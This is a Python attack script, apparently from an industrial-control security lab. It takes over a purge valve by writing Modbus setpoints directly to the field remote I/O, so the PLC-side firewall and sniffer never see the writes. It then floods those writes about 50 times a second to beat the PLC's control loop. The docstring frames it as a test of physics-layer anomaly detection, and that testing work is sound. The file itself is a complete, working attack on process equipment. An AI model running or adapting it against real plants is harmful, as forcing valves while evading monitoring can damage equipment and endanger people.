#!/usr/bin/env python3
"""Field-device bypass attack -- hold a valve by writing the REMOTE I/O directly.

Demonstrates the detection-in-depth point: this write goes to the field device
(192.168.95.12), NOT the PLC, so the PLC-side command firewall and sniffer never see it --
the command layer stays quiet. To beat the PLC's control loop (which re-asserts the valve
every scan), it writes continuously in a tight loop, contesting the valve. If it wins
enough contention the purge behaviour goes abnormal and the PHYSICS layer (L2 varcollapse/
EMD on purge, and L1 on the resulting pressure move) fires -- catching what the command
layer missed.

  python3 field_takeover.py            # hold purge valve closed (0) for 60 s
  python3 field_takeover.py 65535 90   # hold fully open, 90 s

Undo: just stop it; the PLC resumes control. Run from Kali.
"""
import sys, time
from pymodbus.client import ModbusTcpClient

FIELD = "192.168.95.12"   # purge valve remote I/O (same target as write_valve.py)
UNIT  = 247
REG   = 1                 # setpoint register (0-65535 = 0-100% open)
VALUE = int(sys.argv[1]) if len(sys.argv) > 1 else 0
HOLD  = float(sys.argv[2]) if len(sys.argv) > 2 else 60.0

c = ModbusTcpClient(FIELD, port=502, timeout=2)
if not c.connect():
    sys.exit(f"cannot reach field device {FIELD}:502 (firewall/segmentation blocking?)")

print(f"contesting purge valve field I/O {FIELD} reg {REG} -> {VALUE} "
      f"({VALUE*100//65535}%) for {HOLD:.0f}s  (PLC-side command layer will NOT see this)")
t0 = time.time(); n = 0
try:
    while time.time() - t0 < HOLD:
        try:
            c.write_register(REG, VALUE, slave=UNIT)
            n += 1
        except Exception:
            pass
        time.sleep(0.02)              # ~50 writes/s, to out-pace the PLC scan
except KeyboardInterrupt:
    pass
finally:
    c.close()
    print(f"done: sent {n} field writes in {time.time()-t0:.0f}s. PLC now resumes control.")
